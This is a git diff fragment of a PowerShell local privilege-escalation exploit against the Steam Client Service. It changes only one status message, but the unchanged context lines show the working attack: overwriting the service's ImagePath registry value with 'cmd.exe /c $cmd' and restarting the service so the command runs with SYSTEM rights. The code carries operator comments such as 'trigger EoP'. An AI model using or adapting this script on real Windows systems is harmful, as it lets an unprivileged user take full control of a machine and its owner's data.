@@ -9,7 +9,7 @@ Get-Service "Steam Client Service" | Restart-Service
 Write-Host "[*] Sleeping 5 seconds"
 Start-Sleep 5
 Write-Host "[*] DACL on HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service will be overwritten"
-Write-Host "[*] Modifying the binPath on the Steam Client Service..."
+Write-Host "[*] Modifying the Binary Path on the Steam Client Service..."
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service" -Name "ImagePath" -Value "C:\Windows\System32\cmd.exe /c $cmd"
 Write-Host "[*] Binary Path overwritten, restarting the service to trigger EoP. This will error out, just ignore it"
 Get-Service "Steam Client Service" | Restart-Service
